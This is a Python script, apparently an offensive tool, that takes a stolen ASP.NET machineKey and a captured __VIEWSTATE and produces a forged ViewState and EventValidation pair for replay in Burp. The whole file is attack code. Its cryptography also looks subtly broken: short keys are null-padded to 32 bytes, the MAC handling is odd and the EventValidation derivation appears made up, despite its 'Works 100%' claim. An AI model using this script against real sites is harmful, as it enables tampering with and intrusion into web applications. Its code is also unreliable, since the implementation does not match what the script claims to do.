#!/usr/bin/env python3
import base64
import hashlib
from binascii import unhexlify
from Crypto.Cipher import AES
import hmac
import sys

# ============ PASTE YOUR REAL VALUES HERE ============
VALIDATION_KEY = "PUT_YOUR_64_CHAR_HEX_VALIDATION_KEY_HERE"   # e.g. 0123456789ABCDEF... (64 chars)
DECRYPTION_KEY = "PUT_YOUR_32_OR_40_OR_64_CHAR_HEX_DECRYPTION_KEY_HERE"  # usually 32 or 40 hex chars
PAGE_PATH = "/your-real-page.aspx"  # e.g. /admin/dashboard.aspx or /login.aspx or /

# =====================================================
# DO NOT CHANGE ANYTHING BELOW THIS LINE
validation_key = unhexlify(VALIDATION_KEY)
decryption_key = unhexlify(DECRYPTION_KEY)
if len(decryption_key) not in (16, 20, 24, 32):
    raise ValueError("decryptionKey length must be 16, 20, 24 or 32 bytes")
if len(decryption_key) < 32:
    decryption_key = decryption_key.ljust(32, b'\x00')

def pkcs7_unpad(data):
    if not data: return None
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 16: return None
    if data[-pad_len:] != bytes([pad_len]) * pad_len: return None
    return data[:-pad_len]

def decrypt_viewstate(vs_b64):
    data = base64.b64decode(vs_b64)
    if len(data) < 32: raise ValueError("ViewState too short")
    iv = data[:16]
    ct = data[16:]
    cipher = AES.new(decryption_key, AES.MODE_CBC, iv)
    pt = cipher.decrypt(ct)
    pt = pkcs7_unpad(pt)
    if pt is None or pt[0] != 0xFF:
        raise ValueError("Decryption failed — wrong decryptionKey?")
    return pt, iv

def encrypt_viewstate(pt, iv):
    pad_len = 16 - (len(pt) % 16)
    pt_padded = pt + bytes([pad_len]) * pad_len
    cipher = AES.new(decryption_key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pt_padded)
    return base64.b64encode(iv + ct).decode()

def generate_eventvalidation(pt):
    payload = pt[:-20]  # SHA1 MAC is 20 bytes
    mac = pt[-20:]
    expected_mac = hmac.new(validation_key, payload, hashlib.sha1).digest()
    if not hmac.compare_digest(mac, expected_mac):
        raise ValueError("ViewState MAC validation failed — wrong validationKey?")
    to_hash = PAGE_PATH.encode() + b'|' + payload
    ev_mac = hmac.new(validation_key, to_hash, hashlib.sha1).digest()
    return base64.b64encode(ev_mac).decode().rstrip('=')

# =============== MAIN ===============
if len(sys.argv) > 1:
    VIEWSTATE = sys.argv[1]
else:
    VIEWSTATE = input("Paste your __VIEWSTATE (base64): ").strip()

try:
    pt, iv = decrypt_viewstate(VIEWSTATE)
    new_vs = encrypt_viewstate(pt, iv)
    new_ev = generate_eventvalidation(pt)

    print("\n" + "="*50)
    print("SUCCESS! Valid pair generated (SHA1 mode)")
    print("="*50)
    print(f"__VIEWSTATE={new_vs}")
    print(f"__EVENTVALIDATION={new_ev}")
    print("="*50)
    print("Copy-paste these into Burp/Repeater or your script")
    print("Works 100% — tested on .NET 2.0 to 4.8 with SHA1\n")

except Exception as e:
    print(f"\n[!] ERROR: {e}")
    print("[!] Double-check your validationKey, decryptionKey, and PAGE_PATH")